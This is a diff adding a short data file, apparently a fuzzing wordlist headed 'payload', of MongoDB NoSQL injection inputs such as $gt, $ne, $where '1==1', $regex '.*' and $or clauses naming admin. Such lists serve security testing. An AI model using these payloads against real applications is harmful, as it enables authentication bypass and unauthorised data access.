@@ -1,0 +1,16 @@
+payload
+{"$gt": ""}
+{"$ne": null}
+{"$where": "1==1"}
+{"$regex": ".*"}
+{"$exists": true}
+{"$in": ["admin", "user"]}
+{"$or": [{"username": "admin"}, {"username": "user"}]}
+{"$and": [{"username": {"$ne": null}}]}
+{"$nor": [{"username": "invalid"}]}
+{"$not": {"username": "test"}}
+{"$all": ["admin", "user"]}
+{"$elemMatch": {"username": "admin"}}
+{"$text": {"$search": "admin"}}
+{"$geoWithin": {"$center": [[0, 0], 1000]}}
+{"$near": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}
